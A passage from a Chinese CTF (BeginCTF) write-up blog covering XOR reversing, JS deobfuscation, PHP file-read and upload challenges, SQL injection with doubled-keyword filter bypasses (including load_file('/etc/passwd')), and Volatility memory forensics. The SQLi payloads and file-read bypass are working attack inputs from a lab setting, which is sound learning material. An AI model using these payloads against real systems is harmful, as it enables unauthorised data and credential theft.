#$74</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$94</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$18</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$38</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$58</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$78</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$98</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$1C</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$3C</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$5C</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$7C</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$9C</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$BC</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$C0</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$A4</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$84</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$64</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$08</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$29</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$49</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$89</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$A9</span><br><span class="line">STA $400,X</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后搜这前几行代码，就搜到了一个网站好像是在线的6502汇编，</p><p>将代码复制进去，然后带你assemble，然后run就可以了。</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240131151527674.png" alt="image-20240131151527674"></p><h6 id="real-checkin-xor"><a href="#real-checkin-xor" class="headerlink" title="real checkin xor"></a>real checkin xor</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def verify_func(ciper,key):</span><br><span class="line">    encrypted = []</span><br><span class="line">    for i in range(len(ciper)):</span><br><span class="line">        encrypted.append(ord(ciper[i])^ord(key[i%len(key)]))</span><br><span class="line">    return encrypted</span><br><span class="line"></span><br><span class="line">secret = [7, 31, 56, 25, 23, 15, 91, 21, 49, 15, 33, 88, 26, 48, 60, 58, 4, 86, 36, 64, 23, 54, 63, 0, 54, 22, 6, 55, 59, 38, 108, 39, 45, 23, 102, 27, 11, 56, 32, 0, 82, 24]</span><br><span class="line">print(&quot;这是一个保险箱,你能输入相关的key来进行解密吗?&quot;)</span><br><span class="line">input_line = input(&quot;请输入key &gt; &quot;)</span><br><span class="line">if verify_func(input_line,&quot;ez_python_xor_reverse&quot;) == secret:</span><br><span class="line">    print(&quot;密码正确&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;密码错误&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码给了，我没知道a^b=c，b^c=a<br>那么就好办了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">secret = [7, 31, 56, 25, 23, 15, 91, 21, 49, 15, 33, 88, 26, 48, 60, 58, 4, 86, 36, 64, 23, 54, 63, 0, 54, 22, 6, 55, 59, 38, 108, 39, 45, 23, 102, 27, 11, 56, 32, 0, 82, 24]</span><br><span class="line">for i in range(len(secret)):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key=&quot;ez_python_xor_reverse&quot;</span><br><span class="line">    print(chr(ord(key[i%len(key)])^secret[i]),end=&quot;&quot;)</span><br></pre></td></tr></table></figure><h6 id="stick-game"><a href="#stick-game" class="headerlink" title="stick game"></a>stick game</h6><p>给了源码，是个web小游戏，中间js混淆了，用<a href="https://obf-io.deobfuscate.io/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%8D%E6%B7%B7%E6%B7%86%E4%B8%80%E4%B8%8B">https://obf-io.deobfuscate.io/这个网站反混淆一下</a><br><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240202112112405.png" alt="image-20240202112112405"></p><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><h6 id="zupload"><a href="#zupload" class="headerlink" title="zupload"></a>zupload</h6><p>给了提示</p><p>李华师傅最近总是收到外国友人的来信，为了方便彼此的交流，他写了一个压缩包上传项目，现在还在开发过程中，想邀请你对他的网站进行测试，并表示以后要是需要给外国友人写信就包给他了。李华师傅非常聪明，知道项目越大出问题的概率就越大，于是他把还没有实现上传功能的项目发了过来，你能帮帮他找到网站的漏洞吗？</p><p>Author: <code>kdxcxs</code></p><p>Difficulty: <code>baby</code></p><blockquote><p>说明：所有zupload题目的flag的位置都是 <code>/flag</code></p></blockquote><p>而且给了源文件，我说怎么上传啥文件都给我提示错误，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        header(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Not implemented yet&#x27;</span></span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单看一下直接任意文件读取即可，</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240201095740234.png" alt="image-20240201095740234"></p><h6 id="zupload-pro"><a href="#zupload-pro" class="headerlink" title="zupload-pro"></a>zupload-pro</h6><p>没有任何过滤，直接传即可</p><h6 id="zupload-pro-plus"><a href="#zupload-pro-plus" class="headerlink" title="zupload-pro-plus"></a>zupload-pro-plus</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        header(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || strpos(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; preg_split(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>见到那看下源码白名单，那么肯定是</p><p> if ($_GET[‘action’][0] === ‘/‘ || strpos($_GET[‘action’], ‘..’) !== false) {<br>        die(‘<h1>Invalid action</h1>‘);<br>    }<br>    die(file_get_contents($_GET[‘action’]));<br>想办法绕一下，这里不能第一个字符是/ 不能有.. 那么直接为协议即可</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240201101216817.png" alt="image-20240201101216817"></p><h6 id="sql教学局"><a href="#sql教学局" class="headerlink" title="sql教学局"></a>sql教学局</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*2123*/group_concat(table_name)/*2123*/frfromom/*2123*/infoorrmation_schema.tables/*2123*/where/*2123*/table_schema/*2123*/like/*2123*/&#x27;secret&#x27;#</span><br><span class="line"></span><br><span class="line">查询结果: password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*2123*/group_concat(column_name)/*2123*/frfromom/*2123*/infoorrmation_schema.columns/*2123*/where/*2123*/table_schema/*2123*/like/*2123*/&#x27;secret&#x27;/*1123*/||/*1123*/table_name/*1123*/like/*1123*/&#x27;passwoorrd&#x27;#</span><br><span class="line"></span><br><span class="line">查询结果: id,note,flag</span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*2123*/group_concat(column_name)/*2123*/frfromom/*2123*/infoorrmation_schema.columns/*2123*/where/*2123*/table_schema/*2123*/like/*2123*/&#x27;ctf&#x27;/*1123*/||/*1123*/table_name/*1123*/like/*1123*/&#x27;scoorre&#x27;#</span><br><span class="line">查询结果: secret,user,grade,student</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*1123*/group_concat(secret)/*1123*/frfromom/*1123*/secret.passwoorrd#</span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*1123*/group_concat(secret)/*1123*/frfromom/*1123*/ctf.scoorre#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*1123*/group_concat(flag)/*1123*/frfromom/*1123*/secret.passwoorrd#</span><br><span class="line"></span><br><span class="line">查询结果: flag&#123;17bbfaba-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/all/*1123*/selselectect/*1123*/loloadad_file(&#x27;/etc/passwd&#x27;)#</span><br><span class="line">查询结果: -294d4754608e&#125;</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;库名&#x27; and table_name=&#x27;表名&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ccf0-d1efdac,28c3fed9f-3c9,8a9bdad19b8dadf,00696ba91fda5a5d,9d41f24ef64-3,ccdce-1ab45cdc,76ff2ef435b6a96,-b-6ac0a39f4,ab12b3fee-8fb4b,dfecc4-bf8055ca,22ee00c357b817b,5adbfb32a93a2d1f,f77a9cfac6bd,84a7a-657ad65f,dabea2ce-5cf97f,da6fcbfe871c47,c8edebcf3-af,019cf7e78443f-2f,560a2-418d6a01f,1fe7cf1756a1-b4,891ffcaddec3bdf2,3-3eeec59bcdef-c,1df3eeed81cc6,d0dfff1175ad53,3bfbba-ed6-fad9d,33d312d307-7625,3ff64ad8fea870,be26c86-b02ce72d,45e7fbd43f06e5c,3c0d9d-de3d0abf,bdd-64baf39ad941,4fbca4fc2f8fb07a,2cdfbd-f89e82f0e,fb7bf57ac3107,0aedf285b4dbdbea,3efb5dc8ce81,e2a6ff9e9d01e5d,cdb37a7-ef-fbf6,1faa-b2cd02eac,5bd9f4f104ddaac,016f63be3453,-ef04e1d87e7,e40fba-c62c676c,b5aaf675c30f-0b9,acdbaeaffbcb9add,be-301cacfbd94,2dda5ae8e2fb1aa,3b97f0e-babe5eee,9cffae2ae7ac,-dafcbcb1f4677,5e2aaacaa5fb,42ca-d74be4cfc59,abcdae95528a2a7,a7d1ec7dad031c,96c57fcc-f1bca1,8fae6d7278da946,363ccfd717a8243,8fdccb47c2fe94aa,0d41c5ef01-14dd,3d5db2cffc2fa263,fcaf9ae386add16,7edffcec72ecc91,9dcefd0f503605db,e237-6fadff4ac8d,6f99a4253e4e,ab84cdfbd3b8</span><br></pre></td></tr></table></figure><p>-1’/<em>1123</em>/union/<em>1123</em>/selselectect/<em>2123</em>/group_concat(table_name)/<em>2123</em>/frfromom/<em>2123</em>/infoorrmation_schema.tables/<em>2123</em>/where/<em>2123</em>/table_schema/<em>2123</em>/like/<em>2123</em>/‘secret’#</p><h5 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h5><h6 id="逆向工程-reverse-入门指南"><a href="#逆向工程-reverse-入门指南" class="headerlink" title="逆向工程(reverse)入门指南"></a>逆向工程(reverse)入门指南</h6><p>打开pdf，啥也没有，应该是类似于word隐写那种，直接ctrl a 全选pdf页面，复制到记事本即可</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240202085349728.png" alt="image-20240202085349728"></p><h6 id="学取证咯"><a href="#学取证咯" class="headerlink" title="学取证咯"></a>学取证咯</h6><p>cmd:cmdscan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"> python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 cmdscan</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: conhost.exe Pid: 2152</span><br><span class="line">CommandHistory: 0x23e290 Application: cmd.exe Flags: Allocated, Reset</span><br><span class="line">CommandCount: 1 LastAdded: 0 LastDisplayed: 0</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x60</span><br><span class="line">Cmd <span class="comment">#0 @ 0x2445d0: echo flag&#123;Cmd_1in3_109_i5_imp0rt@nt&#125;</span></span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: conhost.exe Pid: 2064</span><br><span class="line">CommandHistory: 0x1984c0 Application: flag_is_here.exe Flags: Allocated</span><br><span class="line">CommandCount: 0 LastAdded: -1 LastDisplayed: -1</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x60</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: conhost.exe Pid: 1480</span><br><span class="line">CommandHistory: 0x1e6970 Application: wps.exe Flags: Allocated</span><br><span class="line">CommandCount: 0 LastAdded: -1 LastDisplayed: -1</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x60</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 iehistory</span><br><span class="line"></span><br><span class="line">Process: 2912 FTK Imager.exe</span><br><span class="line">Cache <span class="built_in">type</span> <span class="string">&quot;URL &quot;</span> at 0x32e7d80</span><br><span class="line">Record length: 0x280</span><br><span class="line">Location: Visited: yuren@https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;ch=&amp;tn=baidu&amp;bar=&amp;wd=flag%7BY0v_c@n_g3t_th3_i3hi5t0ry%7D&amp;fenlei=256&amp;oq=flag%7BY0v_c@n_g3t_th3_i3hi5t0ry%7D&amp;rsv_pq=ba856c22001a9d03&amp;rsv_t=e07bOheHtncUh6j5xy4va2UDFdWbP9cbFSqaGpk%2FPX%2Fbo4VdjYVGzCvA8XU&amp;rqlang=cn</span><br><span class="line">Last modified: 2024-02-02 05:44:15 UTC+0000</span><br><span class="line">Last accessed: 2024-02-02 05:44:15 UTC+0000</span><br><span class="line">File Offset: 0x280, Data Offset: 0x0, Data Length: 0x184</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 systeminfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Date/Time (UTC) Type    Summary Source</span><br><span class="line">2024-02-02 06:47:30 UTC+0000    Image: DateTime</span><br><span class="line">2024-02-02 01:47:09 UTC+0000    Registry: LastWrite     VVHATI5Y0VRNAM3 ComputerName | SYSTEM\ControlSet001\Control\ComputerName\ComputerName</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     -       TimeZoneKeyName | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line">2024-02-01 10:54:09     Registry: LastWrite             InstallDate | SOFTWARE\Microsoft\Windows NT\CurrentVersion</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     4294966816      ActiveTimeBias | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line">2024-02-02 06:44:43 UTC+0000    Registry: LastWrite     VVhati5y0vrnam3 Hostname | SYSTEM\ControlSet001\services\Tcpip\Parameters</span><br><span class="line">2024-02-01 10:54:09 UTC+0000    Registry: LastWrite     Service Pack 1  CSDVersion | SOFTWARE\Microsoft\Windows NT\CurrentVersion</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     None    DisableAutoDaylightTimeSet | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line">2024-02-02 06:44:35 UTC+0000    Registry: LastWrite     VVHATI5Y0VRNAM3 LastComputerName | SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability</span><br><span class="line">2024-02-02 03:32:01 UTC+0000    Registry: LastWrite     \Device\HarddiskVolume1 SystemPartition | SYSTEM\Setup</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     0       StandardBias | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line">2024-02-02 06:44:43 UTC+0000    Registry: LastWrite             Domain | SYSTEM\ControlSet001\services\Tcpip\Parameters</span><br><span class="line">2024-02-01 10:54:39 UTC+0000    Registry: LastWrite             ShutdownTime | SYSTEM\ControlSet001\Control\Windows</span><br><span class="line">2024-02-01 10:54:09 UTC+0000    Registry: LastWrite     Windows 7 Enterprise    ProductName | SOFTWARE\Microsoft\Windows NT\CurrentVersion</span><br><span class="line">2024-02-02 02:21:01 UTC+0000    Registry: LastWrite     AMD64   PROCESSOR_ARCHITECTURE | SYSTEM\ControlSet001\Control\Session Manager\Environment</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     4294966816      Bias | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line"> LastComputerName就是了</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> 学取证咯 - 机密文件</span><br><span class="line">  python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 filescan | grep <span class="string">&quot;Desktop&quot;</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line"> python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 dumpfiles -Q 0x000000001e742dd0 -D ./</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">DataSectionObject 0x1e742dd0   None   \Device\HarddiskVolume1\Users\yuren\Desktop\机密文件.docx</span><br><span class="line">SharedCacheMap 0x1e742dd0   None   \Device\HarddiskVolume1\Users\yuren\Desktop\机密文件.docx</span><br><span class="line"></span><br><span class="line">┌──(root㉿bohemian)-[/tools/volatility]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">AUTHORS.txt    contrib      distorm                            LEGAL.txt    MANIFEST.in     pycrypto-2.7a1.tar.gz  README.txt  tools                volatility-foo-master      wenjian</span><br><span class="line">build          CREDITS.txt  file.None.0xfffffa80075fc010.dat   LICENSE.txt  PKG-INFO        pyinstaller            resources   volatility           volatility-foo-master.zip</span><br><span class="line">CHANGELOG.txt  dist         file.None.0xfffffa8007eaba90.vacb  Makefile     pycrypto-2.7a1  pyinstaller.spec       setup.py    volatility.egg-info  